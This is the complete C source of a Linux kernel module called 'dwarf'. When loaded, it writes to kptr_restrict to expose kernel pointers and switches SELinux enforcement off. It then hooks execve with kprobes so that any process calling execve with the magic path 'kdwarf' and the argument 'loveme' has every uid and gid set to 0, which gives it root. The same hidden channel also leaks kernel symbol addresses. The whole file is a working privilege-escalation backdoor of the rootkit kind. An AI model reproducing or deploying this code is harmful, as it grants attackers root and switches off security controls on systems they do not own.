#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/ptrace.h>
#include <linux/slab.h>
#include <linux/utsname.h>

#define HANDLER_BUF_SIZE 256

static struct kprobe execve_probe;
static struct kprobe compat_execve_probe;

/*
 * function declarations
 */
// dwarf
int elevate(void);
int kptr_unrestrict(void);
int parse_kdwarf_args(char *in, void *out);
int parse_kdwarf_ftrace(char *in, char *tok, void *out);
struct task_struct *get_task_struct_by_pid(unsigned pid);

// file
void file_close(struct file *fp);
struct file *file_open(const char *path, int flags, int rights);
int file_read(struct file *fp, unsigned long long offset, unsigned char *data, unsigned int size);
int file_size(char *path);
int file_sync(struct file *fp);
int file_write(struct file *fp, unsigned long long offset, unsigned char *data, unsigned int size);

static int handler_pre(struct kprobe *p, struct pt_regs *regs) {
    char *in = kmalloc(HANDLER_BUF_SIZE, GFP_KERNEL);
    void *out = kmalloc(HANDLER_BUF_SIZE * 4, GFP_KERNEL);

    int ret;

    ret = strncpy_from_user(in, (void *) regs->regs[0], HANDLER_BUF_SIZE);
    if (ret > 0) {
        printk(KERN_INFO "dwarf -> execve: %s\n", in);
        if (strcmp(in, "kdwarf") == 0) {
            ret = strncpy_from_user(in, (char *) regs->regs[1], HANDLER_BUF_SIZE);
            printk(KERN_INFO "dwarf -> parsing args: %s\n", in);
            ret = parse_kdwarf_args(in, out);
            printk(KERN_INFO "dwarf -> copy to user size: %i\n", ret);
            ret = copy_to_user((void *) regs->regs[2], out, ret);
        }
    }
    kfree(in);
    kfree(out);
    /* A dump_stack() here will give a stack backtrace */
    return 0;
}

int parse_kdwarf_args(char *in, void *out) {
    char *ttok, *tok, *buf;
    unsigned long valx;

    tok = kstrdup(in, GFP_KERNEL);
    ttok = tok;
    buf = strsep(&tok, " ");
    if (buf != NULL) {
        if (strcmp(buf, "available") == 0) {
            sprintf(out, "1 %s %s %s %s", utsname()->sysname, utsname()->version,
                    utsname()->release, utsname()->machine);
            return strlen(out);
        } else if (strcmp(buf, "kallsyms_lookup_name") == 0) {
            buf = strsep(&tok, " ");
            if (buf != NULL) {
                valx = kallsyms_lookup_name(buf);
                memcpy(out, (uintptr_t * ) &valx, sizeof(uintptr_t));
            }
            return sizeof(uintptr_t);
        } else if (strcmp(buf, "loveme") == 0) {
            elevate();
        }
    }

    kfree(ttok);
    return 0;
}

int elevate(void) {
    struct task_struct *task = get_task_struct_by_pid(current->pid);
    struct cred *cred = (struct cred *) __task_cred(task);
    printk(KERN_INFO "dwarf -> changing %d - %s ; uid %d\n",task->pid,task->comm,task->real_cred->uid.val);
    cred->uid.val = 0;
    cred->gid.val =0;
    cred->suid.val = 0;
    cred->sgid.val = 0;
    cred->euid.val = 0;
    cred->egid.val = 0;
    cred->fsuid.val = 0;
    cred->fsgid.val = 0;
    printk(KERN_INFO "dwarf -> uids %d -- %d \n", task->real_cred->uid.val,cred->uid.val);
    printk(KERN_INFO "dwarf -> pid %d , %s is now root\n", task->pid,task->comm);
    return 0;
}

struct task_struct *get_task_struct_by_pid(unsigned pid) {
    struct pid *proc_pid = find_vpid(pid);
    struct task_struct *task;
    if(!proc_pid)
        return 0;
    task = pid_task(proc_pid, PIDTYPE_PID);
    return task;
}

struct file *file_open(const char *path, int flags, int rights) {
    struct file *filp = NULL;
    mm_segment_t oldfs;
    int err = 0;

    oldfs = get_fs();
    set_fs(get_ds());
    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if (IS_ERR(filp)) {
        err = PTR_ERR(filp);
        printk(KERN_INFO "dwarf -> error opening file %s (err: %i)", path, err);
        return NULL;
    }
    return filp;
}

int file_read(struct file *fp, unsigned long long offset, unsigned char *data, unsigned int size) {
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    memset(data, 0, size);
    ret = vfs_read(fp, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

int file_write(struct file *fp, unsigned long long offset, unsigned char *data, unsigned int size) {
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_write(fp, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

void file_close(struct file *fp) {
    filp_close(fp, NULL);
}

int file_sync(struct file *fp) {
    vfs_fsync(fp, 0);
    return 0;
}

int kptr_unrestrict(void) {
    int ret;
    char buf[4];
    char *kptr_restrict_value;

    struct file *fp = file_open("/proc/sys/kernel/kptr_restrict", O_RDWR, O_CREAT);
    if (fp == NULL) {
        printk(KERN_INFO "dwarf -> failed to open kptr_restrict. Skipping");
    } else {
        ret = file_read(fp, 0, buf, 4);
        if (ret > 0) {
            ret = simple_strtol(buf, &kptr_restrict_value, 10);
            printk(KERN_INFO "dwarf -> kptr current value: %i", ret);
            if (ret > 0) {
                ret = file_write(fp, 0, "0", strlen("0"));
                file_sync(fp);
            }
        }
        file_close(fp);
    }
    return 0;
}

int disable_selinux(void) {
    unsigned long *selinux_enforcing = (unsigned long *) kallsyms_lookup_name("selinux_enforcing");
    unsigned long *selinux_enabled = (unsigned long *) kallsyms_lookup_name("selinux_enabled");
    if (selinux_enforcing && *selinux_enforcing) {
        *selinux_enforcing = 0U;
    }
    if (selinux_enabled && *selinux_enabled) {
        *selinux_enabled = 0U;
    }
    return 0;
}

static int __init dwarf_init(void) {
    int ret;

    kptr_unrestrict();
    disable_selinux();

    printk(KERN_INFO "dwarf -> sys execve: 0x%p", (void *) kallsyms_lookup_name("SyS_execve"));
    printk(KERN_INFO "dwarf -> compat sys execve: 0x%p", (void *) kallsyms_lookup_name("compat_SyS_execve"));

    execve_probe.pre_handler = handler_pre;
    execve_probe.addr = (kprobe_opcode_t *) kallsyms_lookup_name("SyS_execve");
    compat_execve_probe.pre_handler = handler_pre;
    compat_execve_probe.addr = (kprobe_opcode_t *) kallsyms_lookup_name("compat_SyS_execve");

    ret = register_kprobe(&execve_probe);
    if (ret < 0) {
        printk(KERN_INFO "dwarf -> cannot register probe on execve, returned %d\n", ret);
        return ret;
    }

    ret = register_kprobe(&compat_execve_probe);
    if (ret < 0) {
        printk(KERN_INFO "dwarf -> cannot register probe on compat execve, returned %d\n", ret);
        //return ret;
    }

    printk(KERN_INFO "dwarf -> planted execve kprobe at %p\n", execve_probe.addr);
    return 0;
}


static void __exit dwarf_end(void) {
    unregister_kprobe(&execve_probe);
    unregister_kprobe(&compat_execve_probe);
    printk(KERN_INFO "dwarf -> kprobe at %p unregistered\n", execve_probe.addr);
    printk(KERN_INFO "dwarf -> kprobe at %p unregistered\n", compat_execve_probe.addr);
}

module_init(dwarf_init);
module_exit(dwarf_end);
MODULE_LICENSE("GPL");